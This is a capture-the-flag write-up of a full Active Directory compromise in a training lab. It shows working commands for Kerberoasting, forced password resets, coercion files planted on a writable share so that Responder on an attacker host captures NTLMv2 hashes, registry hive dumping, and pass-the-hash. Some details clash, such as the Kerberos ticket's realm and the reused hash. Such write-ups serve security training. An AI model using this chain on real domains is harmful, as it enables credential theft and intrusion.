

# Introduction 

Buildingmagic is a single-machine Active Directory environment created by **Tyler Ramsbey** as part of the [HackSmarter](https://courses.hacksmarter.org/dashboard) training platform.  
It is designed to simulate a full domain compromise in a contained lab environment.  

The path to Domain Admin begins with a set of breached user credentials and develops through classic AD techniques, including Kerberoasting, service privilege abuse, and an SMB relay attack delivered via malicious `.lnk` files.  
While a web application on port 8080 initially looks promising, it ultimately serves as a rabbit hole, and the real exploitation occurs entirely within the domain.  

This write-up documents the full chain step by step, from the initial foothold to Domain Admin.
--- 


## Initial Enumeration

As noted in the box brief, this environment simulates an Active Directory setup.  
I began with Rustscan, chaining it with nmap to run default scripts and version detection on discovered ports:

```bash
rustscan -a <IP> --ulimit 5000 -- -sC -sV
```


This revealed a wide range of AD-related services, confirming the host is a Domain Controller for the `BUILDINGMAGIC.LOCAL` domain:

- **53/tcp (DNS)** – Simple DNS Plus
    
- **80/tcp (HTTP)** – Microsoft IIS 10.0
    
- **88/tcp (Kerberos)** – Windows Kerberos
    
- **389/tcp (LDAP)** – Active Directory LDAP
    
    - Domain: `BUILDINGMAGIC.LOCAL`
        
    - Computer: `DC01.BUILDINGMAGIC.LOCAL`
        
- **445/tcp (SMB)** – Microsoft-DS (message signing enabled/required)
    
- **3268/tcp (Global Catalog LDAP)** – Forest-wide LDAP
    
- **3389/tcp (RDP)** – Terminal Services (BUILDINGMAGIC\DC01)
    
- **5985/tcp (WinRM)** – Remote management
    
- **8080/tcp (HTTP)** – Werkzeug web application (_Building Magic Application Portal_)
    
- **9389/tcp (ADWS)** – Active Directory Web Services
    

### Observations
- The host is confirmed as the Domain Controller (`DC01.BUILDINGMAGIC.LOCAL`).  
- SMB requires signing, limiting relay options.  
- RDP and WinRM are exposed for potential remote management once valid creds are obtained.  
- Kerberos can be leveraged for **username discovery and roasting attacks**.  
- LDAP access (depending on permissions) will be useful for **enumerating users, groups, and domain structure**.

### Web Application on Port 8080 (Dead End)

The service on port 8080 exposed a Flask-based web application with a login form and an accessible `/admin` panel.  
The application used signed session cookies.

- The cookie secret was tested with `flask-unsign`.
    
- Cookie manipulation and injection attempts were made against the admin panel.
    
- These tests did not yield valid access.
    

This confirmed that the web application was a rabbit hole, and the exploitation chain continued entirely through Active Directory services
--- 

## Credential Validation & Foothold

The MD5 hash for user `r.widdleton` was cracked using hashcat:

```bash
hashcat -m 0 -a 0 r.widdleton.hash /usr/share/wordlists/rockyou.txt
```

Result
```bash
r.widdleton : <cracked password>
```

The password hash for  t.ren ``` was cracked using CrackStation:

Result
```bash
t.ren : <cracked password> 
```

## Credential Validation with NetExec

The cracked credentials were tested against SMB to confirm validity.

#### SMB Authentication
```bash 
netexec smb 10.0.16.170 -u r.widdleton -p 'lilronron'
 
SMB  10.0.16.170 445 DC01  [+] BUILDINGMAGIC.LOCAL\r.widdleton:lilronron
```

The account `r.widdleton` successfully authenticated as a domain user.

```bash 
netexec smb 10.0.16.170 -u t.ren -p 'shadowhex7'

Result
SMB  10.0.16.170 445 DC01  [-] BUILDINGMAGIC.LOCAL\t.ren:shadowhex7 STATUS_LOGON_FAILURE
```

The account `t.ren` failed authentication.

--- 

## Service Access with r.widdleton

With valid domain credentials for `r.widdleton`, the next stage was to enumerate what services this account could access.

### 1. SMB Share Enumeration
#### Service Access – SMB Share Enumeration

With valid credentials for `r.widdleton`, I enumerated available SMB shares:

```bash
netexec smb 10.0.16.170 -u r.widdleton -p 'lilronron' --shares

Result (abbreviated):
Share        Permissions   Remark
-----        -----------   ------------------------------
ADMIN$                     Remote Admin
C$                        Default share
File-Share                Central Repository of Building Magic's files
IPC$         READ          Remote IPC
NETLOGON                  Logon server share
SYSVOL                    Logon server share
```


#### Share Content Enumeration
Attempts to access and list the contents of these shares using `smbclient` were unsuccessful.  
`r.widdleton` did not have sufficient permissions to read or list files in `File-Share`, `NETLOGON`, or `SYSVOL`.

#### Observations
- While the shares are present, this account has **no useful access** to their contents.  
- SMB is therefore not immediately exploitable with the current user.  
- Enumeration must pivot to **LDAP** or **BloodHound** using the same credentials.

### 2. LDAP Domain Enumeration
With valid credentials for `r.widdleton`, an LDAP bind was established using the UPN format:

```bash 
ldapsearch -x -H ldap://10.0.16.170 -D "r.widdleton@BUILDINGMAGIC.LOCAL" -w 'lilronron' -b "DC=BUILDINGMAGIC,DC=LOCAL"
```

I queried LDAP to enumerate domain objects. 

#### Users 
```bash
ldapsearch -x -H ldap://10.0.16.170 -D "r.widdleton@BUILDINGMAGIC.LOCAL" -w 'lilronron' -b "DC=BUILDINGMAGIC,DC=LOCAL" "(objectClass=user)" sAMAccountName
```
```bash
Administrator
Guest
krbtgt
h.potch
r.widdleton
r.haggard
h.grangon
a.flatch
```

### Groups

```bash
ldapsearch -x -H ldap://10.0.16.170 -D "r.widdleton@BUILDINGMAGIC.LOCAL" -w 'lilronron' -b "DC=BUILDINGMAGIC,DC=LOCAL" "(objectClass=group)" sAMAccountName

```

LDAP enumeration revealed 48 groups in the domain. Notable security-relevant groups include:
- Domain Admins / Enterprise Admins / Schema Admins → full domain control. 
- Backup Operators → can be abused for SYSTEM or DA escalation. 
- Server Operators / Account Operators → delegated rights over accounts and servers. 
- Group Policy Creator Owners → can push malicious GPOs. - DnsAdmins → DLL injection into the DNS service. 
- Key Admins / Enterprise Key Admins → privileged in environments with AD CS. 
- Protected Users → high-value accounts protected against common Kerberos attacks. 
- Other groups observed were standard built-ins (Users, Guests, Replicator, etc.) with no immediate attack value.

### 3. BloodHound Collection
Running BloodHound Python collector to enumerate domain relationships:
```bash
bloodhound-ce-python -u r.widdleton -p 'lilronron' -d BUILDINGMAGIC.LOCAL -dc blodc01.buildingmagic.local-c All
```

--- 

## Privilege Escalation – Kerberoasting

BloodHound identified the user `r.haggard` as having a Service Principal Name (SPN) set, making it Kerberoastable.

### Extracting the Service Ticket
I used Impacket’s `GetUserSPNs.py` with the credentials for `r.widdleton` to request the service ticket:

```bash
GetUserSPNs.py BUILDINGMAGIC.LOCAL/r.widdleton:lilronron -dc-ip 10.0.16.170 -request
```

```bash 
$krb5tgs$23$*r.haggard$BUILDINGMAGIC.LOCAL$HOGWARTS-DC/r.hagrid.WIZARDING.THM~60111*$1be5a25926c1976f2612b81a8d72ac41$6a70f1147a2996d2e1f <---snip--->
```
### Cracking the Ticket

The TGS ticket was then cracked with hashcat:

```bash 
hashcat -m 13100 -a 0 r.haggard.hash /usr/share/wordlists/rockyou.txt
```

Result: 

```bash 
r.haggard : <cracked_password>
```

### Observations

The cracked credentials for `r.haggard` provided a new valid domain user account.  
This expanded the attack surface and opened the door to further privilege escalation.

--- 

## Privilege Abuse – ForceChangePassword

BloodHound analysis revealed that `r.haggard` has the `ForceChangePassword` privilege over the account `h.potch`.

### Abusing the Privilege
Using BloodyAD, I forced a password reset for `h.potch`:

```bash
bloodyAD -d BUILDINGMAGIC.LOCAL -u r.haggard -p '<r.haggard_password>' \
  --host 10.0.16.170 set password h.potch '<NewPassword123!>'

```

### Observations

- The `ForceChangePassword` right allowed taking control of the `h.potch` account.
    
- However, BloodHound showed that `h.potch` is **not a member of Remote Management Users or Remote Desktop Users**, meaning the account cannot be used for direct WinRM or RDP access.
    
- Further enumeration was required to determine how this account could be leveraged within the domain.

--- 
## Service Access – SMB Enumeration with h.potch

After resetting the password for `h.potch`, the new credentials were tested against SMB.

### Share Enumeration
```bash
netexec smb 10.0.16.170 -u h.potch -p '<NewPassword123!>' --shares
```

```bash
Share        Permissions   Remark
-----        -----------   ------------------------------
ADMIN$                     Remote Admin
C$                        Default share
File-Share   READ,WRITE    Central Repository of Building Magic's files
IPC$         READ          Remote IPC
NETLOGON     READ          Logon server share
SYSVOL       READ          Logon server share
```

### Observations

- Unlike `r.widdleton`, the account `h.potch` has **read and write access to the `File-Share` share**.
    
- This share was enumerated further to identify sensitive files, configuration data, or credentials that could aid in privilege escalation.


### File-Share Content Enumeration
Recursive enumeration was attempted with NetExec:

```bash
netexec smb 10.0.16.170 -u h.potch -p 'Password2' --spider File-Share --depth 5 
```

No accessible files or directories of interest were found, however as the share permits write access, there is potential to drop malicious content. 


## Privilege Escalation – SMB Relay via Malicious LNK

With write access to `File-Share`, I created a malicious `.lnk` file designed 
to capture NTLM hashes from users browsing the share.

### Crafting the Malicious LNK
```bash
hashgrab -smb 10.0.16.XXX -o malicious.lnk
```

### Deploying Malicious Files

Hashgrab generated several files designed to coerce authentication requests:

- @important.scf
- @important.url
- important.library-ms
- desktop.ini
- lnk_457.ico

### Capturing Hashes with Responder

A Responder listener was started on the attacker machine:

```bash
sudo responder -I tun0 -dwv
```

These were uploaded to the writable `File-Share`:

```bash
smbclient -U 'BUILDINGMAGIC.LOCAL\h.potch' //10.0.16.170/File-Share
put @important.scf
put @important.url
put important.library-ms
put desktop.ini
put lnk_457.ico
```

### How Hashgrab Works

The files generated by Hashgrab (`.scf`, `.url`, `.library-ms`, `desktop.ini`, `.lnk`)  
reference a remote UNC path such as `\\10.0.16.XXX\share\icon.ico`.

When a user (or a background process) opens the `File-Share` folder,  
Windows Explorer automatically attempts to render icons and metadata.  
This forces the client to authenticate over SMB to the attacker-controlled server,  
leaking NTLM credentials without requiring the user to click or execute the file.

### Result

When the share was accessed, Responder captured NTLMv2 hashes from domain users: 

```bash
h.grangon::BUILDINGMAGIC:462c1f9f3ef22094:D49C872D04139DFFB021167A4D26D852:010100000000000000910F13BC20DC01FD9B8FC29C0F752A00000000020 <---snip---> 
 
 ```

---

## Credential Extraction – Cracking Captured NTLM Hash

The NTLMv2 hash captured by Responder was saved to a file (`captured.hash`) 
and cracked with hashcat.

### Cracking with Hashcat
```bash
hashcat -m 5600 -a 0 captured.hash /usr/share/wordlists/rockyou.txt
```

Result: 

```bash
h.grangon : <cracked_password> 
```

### Observations

The cracked NTLMv2 hash provided valid credentials for ```h.grangon```

These credentials expanded available attack paths for lateral movement  
and further privilege escalation within the domain.

--- 

## Lateral Movement – Compromise of h.grangon

The NTLMv2 hash captured via the malicious files was cracked successfully, 
revealing credentials for the user `h.grangon`.

### Validation
The credentials were validated against SMB:

```bash
netexec smb 10.0.16.170 -u h.grangon -p '<cracked_password>'
```

Result:
[+] BUILDINGMAGIC.LOCAL\h.grangon:<cracked_password>


### BloodHound Analysis

BloodHound confirmed that `h.grangon` is a member of the **Remote Management Users** group.  
This group membership allows interactive access over WinRM.

### Observations

- The compromise of `h.grangon` represented a significant escalation in access.
    
- Unlike previous users, this account supports **interactive lateral movement** into the domain controller.

--- 

## Lateral Movement – WinRM Access with h.grangon

Since `h.grangon` is a member of the **Remote Management Users** group, 
the account can be used for interactive access over WinRM.

### Gaining a Shell
Using Evil-WinRM with the cracked credentials:

```bash
evil-winrm -i 10.0.16.170 -u h.grangon -p '<cracked_password>'
```

result: 
```bash 
Evil-WinRM shell v3.5
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\h.grangon\Documents>
```

## Privilege Enumeration – h.grangon

With a shell as `h.grangon`, privilege enumeration was performed:

```bash
whoami /priv

SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```

--- 

## Privilege Escalation – Abusing SeBackupPrivilege

The account `h.grangon` had the `SeBackupPrivilege` right enabled.  
This privilege allows reading of otherwise protected system files, 
including registry hives containing sensitive credential data.

### Dumping the Registry Hives
Using `reg save`, the SAM and SYSTEM hives were exported to a writable directory:

```powershell
*Evil-WinRM* PS C:\Users\h.grangon\Documents> mkdir C:\temp

*Evil-WinRM* PS C:\Users\h.grangon\Documents> reg save hklm\sam C:\temp\sam.hive
The operation completed successfully.

*Evil-WinRM* PS C:\Users\h.grangon\Documents> reg save hklm\system C:\temp\system.hive
The operation completed successfully.
```


### Downloading the Hive Files

Once the SAM and SYSTEM hives were saved into `C:\temp`, they were 
downloaded to the attacker machine with Evil-WinRM.

```bash
download "C:\\temp\\sam.hive"
download "C:\\temp\\system.hive"
```

--- 

## Credential Extraction – Local Administrator

Using the dumped SAM and SYSTEM hives, Impacket’s `secretsdump.py` was used to extract local account hashes:

```bash
secretsdump.py -sam sam.hive -system system.hive LOCAL
```

An attempt was made to crack the Administrator hash with hashcat but did not yield the password. 

```bash 
hashcat -m 1000 -a 0 admin.hash /usr/share/wordlists/rockyou.txt
```

## Lateral Movement – Pass-the-Hash as Administrator

The local Administrator hash was obtained from the SAM and SYSTEM hives 
using `secretsdump.py`. Although not crackable with common wordlists, 
it could be used directly with pass-the-hash.

### Validating the Hash with NetExec
```bash
netexec smb 10.0.16.170 -u Administrator -H <NTLM_hash>
```

## Domain Admin Access – a.flatch

Although the local Administrator hash did not yield access, 
BloodHound/LDAP enumeration revealed that `a.flatch` was a member 
of the **Domain Admins** group.

### Pass-the-Hash with a.flatch
Using the recovered NTLM hash, authentication was successful:

```bash
netexec smb 10.0.16.170 -u a.flatch -H localadmin.hash
```

Result: 

``` bash 
SMB 10.0.16.170 [+] BUILDINGMAGIC.LOCAL\a.flatch:520126a03f5d5a8d836f1c4f34ede7ce
```

### Domain Admin Shell with Evil-WinRM

With valid NTLM credentials, interactive access was obtained:

```bash 
evil-winrm -i 10.0.16.170 -u a.flatch -H localadmin.hash

Evil-WinRM shell v3.5
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\a.flatch\Documents> whoami
buildingmagic\a.flatch
```

### Proof of Domain Admin Privileges

To confirm domain-level privileges:

```powershell
*Evil-WinRM* PS C:\> whoami /groups
```


Result (abbreviated):

```powershell 
Group Name: Domain Admins Group Name: Enterprise Admins Group Name: Schema Admins ...
```


### Observations

- Successful pass-the-hash authentication as `a.flatch` confirmed access to a **Domain Admin account**.
    
- The Evil-WinRM shell provided full interactive control of the domain controller.
    
- At this point, the Active Directory environment was fully compromised.

--- 
## Conclusion

This lab demonstrated an end-to-end Active Directory compromise, starting 
from a low-privileged user and escalating to Domain Admin by chaining 
several misconfigurations and attack techniques:

r.widdleton → r.haggard → h.potch → h.grangon → a.flatch (Domain Admin)

Final outcome: interactive shell as a Domain Admin (`a.flatch`), 
confirming full control of the Active Directory environment.




## Key Takeaways


- The service account `r.haggard` had an SPN set, making it vulnerable to Kerberoasting. Cracking the ticket exposed valid credentials.  
- The `ForceChangePassword` right over `h.potch` demonstrated how delegated privileges can be abused to reset another user’s password.  
- Write access on `File-Share` allowed the placement of coercion files, which triggered NTLMv2 authentication attempts and exposed additional hashes.  
- The `SeBackupPrivilege` assigned to `h.grangon` enabled extraction of the SAM and SYSTEM hives directly from the domain controller.  
- Password/hash reuse meant the same NTLM hash was valid for `a.flatch`, a Domain Admin, resulting in full domain compromise.  


These highlight how chained misconfigurations in Active Directory can allow 
an attacker to progress from an ordinary user to complete domain control.
